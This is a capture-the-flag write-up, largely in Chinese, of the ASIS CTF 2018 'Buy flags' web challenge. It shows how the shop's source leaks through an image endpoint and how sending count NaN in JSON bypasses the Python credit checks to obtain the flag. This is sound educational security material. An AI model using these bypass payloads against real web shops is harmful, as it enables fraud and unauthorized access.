# Buy flags

> Challenge Link: [Buy flags](https://asisctf.com/challenges/)
>
> Category: misc
>
> Writeup: [Buy flags](https://github.com/frozenkp/CTF/tree/master/2018/ASIS_CTF_qual/web/Buy_flags)

[Here](http://46.101.173.61/) is an online shop that sells flags :) but we don’t have enough money! Can you buy the flag?

## Observation

這是一個可以購買 flag 的網站，可以勾選想要的 flag，然後輸入 coupon，不過 credit 是 0，也不知道 coupon 是啥，所以都只會回傳 "your credit not enough"

![](https://i.imgur.com/a349JzK.png)

### pay API

按下 pay 以後會 POST 到 http://46.101.173.61/pay

傳的內容有 coupon 以及點選的 flag 項目及數量

```json
{"card": [{"name": "asis", "count": 1}], "coupon": "YWJj"}
```

結果也是用 json 回傳

```json
{"result": "your credit not enough"}
```

這邊有嘗試把 count 改成 0 或是 -1，不過 server 都有處理掉

```json
{"card":[{"name":"asis","count":-1}],"coupon":"aA=="}
```

```json
{"result": "item count must be greater than zero"}
```

### image API

檢查原始碼以後發現圖片是由 http://46.101.173.61/image?name=asis.png 傳過來的，看起來應該是可以做 LFI，不過經過測試後發現只要輸入 `/` 或 `..` 就會回傳 `Access Denied`，猜測可能 server 的檔案也放在當前目錄，所以試了 `server.py` ，但也沒拿到

### flask session

Cookie 的部分有一個 session，乍看之下以為是 jwt，第一段可以解出 data，但其他兩段就完全不能解了

後來查了一下才知道是 flask session，後面兩段是用來驗證第一段的 data 的，需要有 secret key 才能偽造

```
eyJjb3Vwb25zIjpbXSwiY3JlZGl0IjowfQ.Dctipw.Q8aC2jTPn9lLxZQU-0Fc3oBx3Ig
```

```json
{"coupons":[],"credit":0}
```



## Solution

解法的部分是在賽後參照 Writeup 的

### Source code

首先是可以利用 image API 拿到 `app.py`  (flask 的預設 server file)

```
http://46.101.173.61/image?name=app.py
```

其中，flag 是放在 private/flag.txt，secret key 則是放在 private/secret.txt

```python
4   app.secret_key = open('private/secret.txt').read()
20  'data': open('private/flag.txt').read()
```

看一下 image API 的寫法，已經把 private 底下的檔案濾掉了

```python
if '/' in image_name or '..' in image_name or 'private' in image_name:
	return 'Access Denied'
```

### json NaN

最後的解法是在 pay API 把數量改成 NaN 就可以拿到 flag 了

原始碼中，count 的驗證如下

```python
data = request.get_json()
card = data['card']
for flag in card:
    if flag['count'] <= 0:
        return jsonify({'result':'item count must be greater than zero'})
```

實際測試一下，NaN 在 parse 後是 float，且可以通過 `<= 0` 的驗證

```python
>>> text = '{"var":NaN}'
>>> data = json.loads(text)
>>> print data
{u'var': nan}
>>> data['var']
nan
>>> type(data['var'])
<type 'float'>
>>> data['var'] <= 0
False
```

接下來在計算 credit 時的驗證方法如下

```python
for flag in card:
	credit -= flag['count'] * flags[flag['name']]['price']
if credit < 0:
	result = {'result': 'your credit not enough'}
```

實際測試後發現，只要操作流程中有用到 nan，該變數就會被設成 nan，也就可以順利通過驗證了

```python
>>> credit = 0
>>> credit -= data['var'] * 110
>>> credit
nan
>>> credit < 0
False
```

